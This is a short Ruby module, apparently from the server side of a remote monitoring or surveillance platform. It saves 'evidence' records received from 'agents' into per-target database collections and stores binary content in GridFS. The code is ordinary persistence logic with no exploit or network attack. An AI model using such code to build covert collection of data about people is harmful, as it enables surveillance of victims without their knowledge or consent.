# from RCS::Common
require 'rcs-common/trace'

module SingleEvidence
  
  def self.extended(base)
    base.send :include, InstanceMethods
    base.send :include, RCS::Tracer
    
    base.instance_exec do
      # default values
      
    end
  end
  
  module InstanceMethods
    def get_agent
      ::Item.agents.where({instance: info[:instance], ident: info[:ident]}).first
    end
    
    def store
      agent = get_agent
      target = agent.get_parent
      
      evidence = ::Evidence.collection_class(target[:_id].to_s)
      evidence.create do |ev|

        ev.agent_id = agent[:_id].to_s
        ev.type = info[:type]

        ev.acquired = info[:acquired].to_i
        ev.received = info[:received].to_i
        ev.relevance = 0
        ev.blotter = false
        ev.note = ""

        ev.data = info[:data]

        # save the binary data (if any)
        unless info[:grid_content].nil?
          ev.data[:_grid_size] = info[:grid_content].bytesize
          ev.data[:_grid] = RCS::DB::GridFS.put(info[:grid_content], {filename: agent[:_id].to_s}, target[:_id].to_s) unless info[:grid_content].nil?
        end

        ev.save

        trace :debug, "saved evidence #{ev._id}"
      end

      return evidence
    end
  end

end # SingleEvidence
